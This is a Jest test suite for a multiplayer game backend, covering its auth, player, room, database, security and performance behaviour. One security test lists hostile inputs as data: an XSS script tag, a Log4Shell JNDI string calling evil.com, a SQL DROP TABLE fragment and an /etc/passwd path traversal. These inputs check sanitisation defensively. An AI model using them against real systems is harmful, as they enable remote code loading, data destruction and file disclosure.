/**
 * Comprehensive Backend Testing Suite
 * Task 26: Backend API Comprehensive Testing
 * 
 * This test suite provides comprehensive testing for all backend components
 */

import request from 'supertest';
import jwt from 'jsonwebtoken';
import express, { Express } from 'express';
import { connectDB, disconnectDB, clearDB, setupTestApp } from './setup';
import { Player } from '../models/Player';
import { Room, RoomStatus } from '../models/Room';
import { AuthService } from '../services/AuthService';

describe('Comprehensive Backend Testing Suite', () => {
  let app: Express;
  let testPlayers: any[] = [];
  let testRooms: any[] = [];
  let authTokens: string[] = [];

  beforeAll(async () => {
    await connectDB();
  });

  afterAll(async () => {
    await disconnectDB();
  });

  beforeEach(async () => {
    await clearDB();
    app = await setupTestApp();
    await createTestData();
  });

  afterEach(async () => {
    await clearDB();
    testPlayers = [];
    testRooms = [];
    authTokens = [];
  });

  async function createTestData() {
    const playerConfigs = [
      { username: 'testhost', email: 'host@test.com', eloRating: 1200 },
      { username: 'player2', email: 'player2@test.com', eloRating: 1000 },
      { username: 'player3', email: 'player3@test.com', eloRating: 1500 },
      { username: 'newbie', email: 'newbie@test.com', eloRating: 800 },
      { username: 'expert', email: 'expert@test.com', eloRating: 1800 }
    ];

    for (const config of playerConfigs) {
      const player = await Player.create({
        ...config,
        password: 'hashedpassword',
        avatar: `${config.username}-avatar.png`,
        statistics: {
          gamesPlayed: Math.floor(Math.random() * 100),
          gamesWon: Math.floor(Math.random() * 50),
          winRate: Math.random(),
          favoriteRole: 'villager',
          averageGameDuration: 300000 + Math.random() * 600000,
          eloRating: config.eloRating
        }
      });
      testPlayers.push(player);
      
      const token = jwt.sign(
        { userId: player._id.toString(), username: player.username },
        process.env.JWT_ACCESS_SECRET || 'test-access-secret',
        { expiresIn: '1h' }
      );
      authTokens.push(token);
    }

    const roomConfigs = [
      { isPublic: true, maxPlayers: 8, status: RoomStatus.WAITING },
      { isPublic: false, maxPlayers: 6, status: RoomStatus.WAITING },
      { isPublic: true, maxPlayers: 12, status: RoomStatus.IN_PROGRESS }
    ];

    for (let i = 0; i < roomConfigs.length; i++) {
      const config = roomConfigs[i];
      const room = await Room.create({
        code: `TEST${i.toString().padStart(2, '0')}`,
        hostId: testPlayers[i % testPlayers.length]._id,
        players: [testPlayers[i % testPlayers.length]._id],
        settings: {
          isPublic: config.isPublic,
          maxPlayers: config.maxPlayers,
          gameSettings: {
            maxPlayers: config.maxPlayers,
            enableVoiceChat: i % 2 === 0,
            dayPhaseDuration: 300000,
            nightPhaseDuration: 120000,
            votingDuration: 60000,
            roles: []
          },
          allowSpectators: i % 3 === 0,
          requireInvite: !config.isPublic
        },
        status: config.status
      });
      testRooms.push(room);
    }
  }

  /**
   * 1. EXHAUSTIVE REST API ENDPOINT TESTING
   */
  describe('1. REST API Endpoints - Comprehensive Testing', () => {
    
    describe('Authentication API Edge Cases', () => {
      it('should handle all registration validation scenarios', async () => {
        const testCases = [
          { 
            data: { username: '', password: 'test123' }, 
            expectedStatus: 400,
            description: 'empty username'
          },
          { 
            data: { username: 'ab', password: 'test123' }, 
            expectedStatus: 400,
            description: 'username too short'
          },
          { 
            data: { username: 'a'.repeat(21), password: 'test123' }, 
            expectedStatus: 400,
            description: 'username too long'
          },
          { 
            data: { username: 'test@user', password: 'test123' }, 
            expectedStatus: 400,
            description: 'invalid username characters'
          },
          { 
            data: { username: 'testuser', password: '123' }, 
            expectedStatus: 400,
            description: 'password too short'
          },
          { 
            data: { username: 'testuser', password: 'test123', email: 'invalid' }, 
            expectedStatus: 400,
            description: 'invalid email format'
          },
          { 
            data: { username: 'validuser', password: 'validpass', email: 'valid@test.com' }, 
            expectedStatus: 201,
            description: 'valid registration'
          }
        ];

        for (const testCase of testCases) {
          const response = await request(app)
            .post('/api/auth/register')
            .send(testCase.data);
          
          expect(response.status).toBe(testCase.expectedStatus);
          
          if (testCase.expectedStatus === 201) {
            expect(response.body.success).toBe(true);
            expect(response.body.data.accessToken).toBeDefined();
            expect(response.body.data.refreshToken).toBeDefined();
          } else {
            expect(response.body.success).toBe(false);
            expect(response.body.message).toBeDefined();
          }
        }
      });

      it('should handle concurrent registration attempts', async () => {
        const userData = {
          username: 'concurrent',
          password: 'test123',
          email: 'concurrent@test.com'
        };

        const promises = Array(5).fill(null).map(() =>
          request(app).post('/api/auth/register').send(userData)
        );

        const results = await Promise.allSettled(promises);
        const successful = results.filter(r => 
          r.status === 'fulfilled' && (r.value as any).status === 201
        );
        
        expect(successful).toHaveLength(1);
      });

      it('should handle various token scenarios', async () => {
        // Test expired token
        const expiredToken = jwt.sign(
          { userId: testPlayers[0]._id.toString(), username: testPlayers[0].username },
          process.env.JWT_ACCESS_SECRET || 'test-access-secret',
          { expiresIn: '-1h' }
        );

        await request(app)
          .get('/api/auth/me')
          .set('Authorization', `Bearer ${expiredToken}`)
          .expect(401);

        // Test malformed tokens
        const malformedTokens = [
          'invalid.token.format',
          'Bearer invalid',
          'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid',
          ''
        ];

        for (const token of malformedTokens) {
          await request(app)
            .get('/api/auth/me')
            .set('Authorization', `Bearer ${token}`)
            .expect(401);
        }
      });
    });

    describe('Player Management API Edge Cases', () => {
      it('should handle profile update validation', async () => {
        const testCases = [
          { data: { username: 'newname' }, expectedStatus: 200 },
          { data: { username: '' }, expectedStatus: 400 },
          { data: { username: 'ab' }, expectedStatus: 400 },
          { data: { username: testPlayers[1].username }, expectedStatus: 400 },
          { data: { avatar: 'new-avatar.png' }, expectedStatus: 200 }
        ];

        for (const testCase of testCases) {
          await request(app)
            .put('/api/players/profile')
            .set('Authorization', `Bearer ${authTokens[0]}`)
            .send(testCase.data)
            .expect(testCase.expectedStatus);
        }
      });

      it('should handle friend management edge cases', async () => {
        // Add friend successfully
        await request(app)
          .post('/api/players/friends')
          .set('Authorization', `Bearer ${authTokens[0]}`)
          .send({ friendId: testPlayers[1]._id.toString() })
          .expect(200);

        // Try to add same friend again (should fail)
        await request(app)
          .post('/api/players/friends')
          .set('Authorization', `Bearer ${authTokens[0]}`)
          .send({ friendId: testPlayers[1]._id.toString() })
          .expect(400);

        // Try to add self as friend (should fail)
        await request(app)
          .post('/api/players/friends')
          .set('Authorization', `Bearer ${authTokens[0]}`)
          .send({ friendId: testPlayers[0]._id.toString() })
          .expect(400);

        // Try to add non-existent player (should fail)
        await request(app)
          .post('/api/players/friends')
          .set('Authorization', `Bearer ${authTokens[0]}`)
          .send({ friendId: '507f1f77bcf86cd799439011' })
          .expect(400);
      });

      it('should handle search functionality', async () => {
        const searchCases = [
          { query: 'test', expectedMinResults: 1 },
          { query: 'nonexistent', expectedResults: 0 },
          { query: 'a', expectedStatus: 400 }, // Too short
          { query: '', expectedStatus: 400 }, // Empty
          { query: 'player', expectedMinResults: 1 }
        ];

        for (const searchCase of searchCases) {
          const response = await request(app)
            .get(`/api/players/search?q=${searchCase.query}`)
            .set('Authorization', `Bearer ${authTokens[0]}`)
            .expect(searchCase.expectedStatus || 200);

          if (searchCase.expectedResults !== undefined) {
            expect(response.body.data.players).toHaveLength(searchCase.expectedResults);
          } else if (searchCase.expectedMinResults !== undefined) {
            expect(response.body.data.players.length).toBeGreaterThanOrEqual(searchCase.expectedMinResults);
          }
        }
      });
    });

    describe('Room Management API Edge Cases', () => {
      it('should handle room creation validation', async () => {
        const roomSettings = [
          { isPublic: true, maxPlayers: 4, expectedStatus: 201 },
          { isPublic: false, maxPlayers: 12, expectedStatus: 201 },
          { isPublic: true, maxPlayers: 25, expectedStatus: 400 }, // Too many
          { isPublic: true, maxPlayers: 2, expectedStatus: 400 }   // Too few
        ];

        for (let i = 0; i < roomSettings.length; i++) {
          const settings = roomSettings[i];
          await request(app)
            .post('/api/rooms')
            .set('Authorization', `Bearer ${authTokens[i % authTokens.length]}`)
            .send({ settings })
            .expect(settings.expectedStatus);
        }
      });

      it('should handle room joining scenarios', async () => {
        const room = testRooms[0];
        
        // Valid join
        await request(app)
          .post('/api/rooms/join')
          .set('Authorization', `Bearer ${authTokens[1]}`)
          .send({ roomIdentifier: room.code })
          .expect(200);

        // Try to join same room again (should fail)
        await request(app)
          .post('/api/rooms/join')
          .set('Authorization', `Bearer ${authTokens[1]}`)
          .send({ roomIdentifier: room.code })
          .expect(400);

        // Try to join non-existent room (should fail)
        await request(app)
          .post('/api/rooms/join')
          .set('Authorization', `Bearer ${authTokens[2]}`)
          .send({ roomIdentifier: 'NONE01' })
          .expect(400);
      });

      it('should handle public room filtering', async () => {
        const filterTests = [
          { query: '', expectedMinResults: 2 },
          { query: '?maxPlayers=8', expectedMinResults: 1 },
          { query: '?hasVoiceChat=true', expectedMinResults: 1 },
          { query: '?page=1&limit=1', expectedResults: 1 },
          { query: '?page=0', expectedStatus: 400 },
          { query: '?limit=0', expectedStatus: 400 }
        ];

        for (const test of filterTests) {
          const response = await request(app)
            .get(`/api/rooms/public${test.query}`)
            .expect(test.expectedStatus || 200);

          if (test.expectedResults !== undefined) {
            expect(response.body.data.rooms).toHaveLength(test.expectedResults);
          } else if (test.expectedMinResults !== undefined) {
            expect(response.body.data.rooms.length).toBeGreaterThanOrEqual(test.expectedMinResults);
          }
        }
      });
    });
  });

  /**
   * 2. AUTHENTICATION FLOWS WITH TOKEN SCENARIOS
   */
  describe('2. Authentication Flows - Token Management', () => {
    
    it('should handle refresh token rotation', async () => {
      const registerResult = await AuthService.register({
        username: 'tokentest',
        password: 'test123',
        email: 'token@test.com'
      });

      let currentRefreshToken = registerResult.refreshToken!;
      
      // Perform multiple token refreshes
      for (let i = 0; i < 3; i++) {
        const response = await request(app)
          .post('/api/auth/refresh')
          .send({ refreshToken: currentRefreshToken })
          .expect(200);

        expect(response.body.data.refreshToken).not.toBe(currentRefreshToken);
        currentRefreshToken = response.body.data.refreshToken;
      }
    });

    it('should handle concurrent token refresh attempts', async () => {
      const registerResult = await AuthService.register({
        username: 'concurrent',
        password: 'test123',
        email: 'concurrent@test.com'
      });

      const refreshToken = registerResult.refreshToken!;
      
      // Attempt multiple concurrent refreshes
      const promises = Array(3).fill(null).map(() =>
        request(app).post('/api/auth/refresh').send({ refreshToken })
      );

      const results = await Promise.allSettled(promises);
      const successful = results.filter(r => 
        r.status === 'fulfilled' && (r.value as any).status === 200
      );
      
      // Only one should succeed due to token rotation
      expect(successful).toHaveLength(1);
    });

    it('should handle logout scenarios', async () => {
      const user = {
        username: 'multidevice',
        password: 'test123',
        email: 'multi@test.com'
      };

      // Register and get first token
      const register1 = await AuthService.register(user);
      
      // Login again to simulate second device
      const login2 = await AuthService.login({
        username: user.username,
        password: user.password
      });

      // Logout from all devices
      await request(app)
        .delete('/api/auth/logout-all')
        .set('Authorization', `Bearer ${register1.accessToken}`)
        .expect(200);

      // Both refresh tokens should be invalidated
      await request(app)
        .post('/api/auth/refresh')
        .send({ refreshToken: register1.refreshToken })
        .expect(401);

      await request(app)
        .post('/api/auth/refresh')
        .send({ refreshToken: login2.refreshToken })
        .expect(401);
    });
  });

  /**
   * 3. DATABASE OPERATIONS WITH EDGE CASES
   */
  describe('3. Database Operations - Edge Cases', () => {
    
    it('should handle invalid ObjectId formats', async () => {
      await request(app)
        .get('/api/rooms/invalid-object-id')
        .set('Authorization', `Bearer ${authTokens[0]}`)
        .expect(400);
    });

    it('should handle concurrent database operations', async () => {
      const room = testRooms[0];
      
      // Multiple players trying to join the same room simultaneously
      const joinPromises = authTokens.slice(1, 4).map(token =>
        request(app)
          .post('/api/rooms/join')
          .set('Authorization', `Bearer ${token}`)
          .send({ roomIdentifier: room.code })
      );

      const results = await Promise.allSettled(joinPromises);
      const successful = results.filter(r => 
        r.status === 'fulfilled' && (r.value as any).status === 200
      );
      
      expect(successful.length).toBeGreaterThan(0);
      expect(successful.length).toBeLessThanOrEqual(room.settings.maxPlayers - 1);
    });

    it('should handle large dataset operations', async () => {
      // Create many players for leaderboard test
      const manyPlayers = [];
      for (let i = 0; i < 50; i++) {
        manyPlayers.push({
          username: `player${i}`,
          email: `player${i}@test.com`,
          password: 'hashedpassword',
          statistics: {
            gamesPlayed: Math.floor(Math.random() * 100),
            gamesWon: Math.floor(Math.random() * 50),
            winRate: Math.random(),
            favoriteRole: 'villager',
            averageGameDuration: 300000,
            eloRating: 800 + Math.random() * 1000
          }
        });
      }

      await Player.insertMany(manyPlayers);

      // Test leaderboard with large dataset
      const response = await request(app)
        .get('/api/players/leaderboard?limit=20')
        .expect(200);

      expect(response.body.data.players).toHaveLength(20);
      expect(response.body.data.players[0].statistics.eloRating)
        .toBeGreaterThanOrEqual(response.body.data.players[19].statistics.eloRating);
    });
  });

  /**
   * 4. SECURITY AND MIDDLEWARE TESTING
   */
  describe('4. Security and Middleware Testing', () => {
    
    it('should sanitize malicious input', async () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '${jndi:ldap://evil.com/a}',
        'DROP TABLE users;',
        '../../etc/passwd'
      ];

      for (const input of maliciousInputs) {
        const response = await request(app)
          .post('/api/auth/register')
          .send({
            username: input,
            password: 'test123',
            email: 'test@example.com'
          });

        // Should either reject the input or sanitize it
        if (response.status === 201) {
          expect(response.body.data.player.username).not.toBe(input);
        } else {
          expect(response.status).toBe(400);
        }
      }
    });

    it('should enforce security headers', async () => {
      const response = await request(app)
        .get('/api/rooms/public')
        .expect(200);

      // Check for common security headers
      expect(response.headers['x-content-type-options']).toBeDefined();
      expect(response.headers['x-frame-options']).toBeDefined();
    });

    it('should handle CORS properly', async () => {
      const response = await request(app)
        .options('/api/auth/register')
        .set('Origin', 'http://localhost:3000')
        .set('Access-Control-Request-Method', 'POST');

      expect(response.headers['access-control-allow-origin']).toBeDefined();
    });

    it('should limit request body size', async () => {
      const largeData = {
        username: 'test',
        password: 'test123',
        email: 'test@example.com',
        largeField: 'x'.repeat(20 * 1024 * 1024) // 20MB
      };

      const response = await request(app)
        .post('/api/auth/register')
        .send(largeData);

      expect([400, 413]).toContain(response.status);
    });
  });

  /**
   * 5. PERFORMANCE AND STRESS TESTING
   */
  describe('5. Performance and Stress Testing', () => {
    
    it('should handle concurrent API requests', async () => {
      const concurrentRequests = 20;
      const requests = [];

      for (let i = 0; i < concurrentRequests; i++) {
        requests.push(
          request(app)
            .get('/api/rooms/public')
            .expect(200)
        );
      }

      const startTime = Date.now();
      const results = await Promise.allSettled(requests);
      const endTime = Date.now();

      const successful = results.filter(r => r.status === 'fulfilled');
      expect(successful.length).toBe(concurrentRequests);
      expect(endTime - startTime).toBeLessThan(5000); // Should complete within 5 seconds
    });

    it('should maintain reasonable memory usage', async () => {
      const initialMemory = process.memoryUsage();

      // Perform memory-intensive operations
      const largeDataRequests = [];
      for (let i = 0; i < 10; i++) {
        largeDataRequests.push(
          request(app)
            .get('/api/players/leaderboard?limit=100')
            .expect(200)
        );
      }

      await Promise.all(largeDataRequests);

      const finalMemory = process.memoryUsage();
      const memoryIncrease = finalMemory.heapUsed - initialMemory.heapUsed;

      // Memory increase should be reasonable (less than 100MB)
      expect(memoryIncrease).toBeLessThan(100 * 1024 * 1024);
    });
  });

  /**
   * 6. INTEGRATION TESTING - END-TO-END SCENARIOS
   */
  describe('6. Integration Testing - End-to-End', () => {
    
    it('should handle complete user journey', async () => {
      // Register new user
      const newUser = {
        username: 'journeytest',
        password: 'test123',
        email: 'journey@test.com'
      };

      const registerResponse = await request(app)
        .post('/api/auth/register')
        .send(newUser)
        .expect(201);

      const token = registerResponse.body.data.accessToken;

      // Update profile
      await request(app)
        .put('/api/players/profile')
        .set('Authorization', `Bearer ${token}`)
        .send({ avatar: 'new-avatar.png' })
        .expect(200);

      // Search for friends
      await request(app)
        .get('/api/players/search?q=test')
        .set('Authorization', `Bearer ${token}`)
        .expect(200);

      // Browse public rooms
      await request(app)
        .get('/api/rooms/public')
        .expect(200);

      // Create own room
      const roomResponse = await request(app)
        .post('/api/rooms')
        .set('Authorization', `Bearer ${token}`)
        .send({})
        .expect(201);

      // Update room settings
      await request(app)
        .put(`/api/rooms/${roomResponse.body.data._id}/settings`)
        .set('Authorization', `Bearer ${token}`)
        .send({
          settings: {
            isPublic: false,
            maxPlayers: 6
          }
        })
        .expect(200);

      // Leave room
      await request(app)
        .post(`/api/rooms/${roomResponse.body.data._id}/leave`)
        .set('Authorization', `Bearer ${token}`)
        .expect(200);
    });

    it('should handle error scenarios gracefully', async () => {
      // Test various error conditions
      const errorTests = [
        { endpoint: '/api/auth/me', method: 'get', auth: false, expectedStatus: 401 },
        { endpoint: '/api/rooms/nonexistent', method: 'get', auth: true, expectedStatus: 400 },
        { endpoint: '/api/players/friends', method: 'post', auth: true, data: {}, expectedStatus: 400 }
      ];

      for (const test of errorTests) {
        let req: any;
        
        if (test.method === 'get') {
          req = request(app).get(test.endpoint);
        } else if (test.method === 'post') {
          req = request(app).post(test.endpoint);
        } else if (test.method === 'put') {
          req = request(app).put(test.endpoint);
        } else if (test.method === 'delete') {
          req = request(app).delete(test.endpoint);
        }
        
        if (test.auth) {
          req.set('Authorization', `Bearer ${authTokens[0]}`);
        }
        
        if (test.data) {
          req.send(test.data);
        }

        await req.expect(test.expectedStatus);
      }
    });
  });
});